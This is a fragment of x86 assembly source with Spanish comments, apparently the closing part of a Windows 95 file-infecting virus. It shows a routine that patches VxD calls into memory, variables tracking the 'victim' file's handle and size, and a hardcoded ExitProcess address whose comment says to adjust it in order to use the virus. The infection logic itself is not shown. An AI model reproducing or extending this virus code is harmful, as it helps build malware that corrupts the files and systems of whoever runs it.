;                               db 06h dup (?) < 6 bytes de hueco.
;
LlamadaVxD:                     pushad

                                mov esi,[esp+20h]
                                lea edi,[esi+04h]

                                mov ax,20CDh    ; int 20h
                                stosw

                                movsd

                                add dword ptr [esp+20h],00000004h

                                popad

                                ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; Variables...

TamannoDeLaVictima              dd ?
TamannoAnnadido                 dd ?
FileHandleDeLaVictima           dd ?

ValorSalvadoDeESP               dd ?

FinDelCodigo:                   dd 0BFF8AECDh   ; Mi ExitProcess ( W95 )...
                                                ; Para usar el virus, cambiarlo por lo adecuado.

end                             ComienzoDelCodigoDePrimeraE
                                end
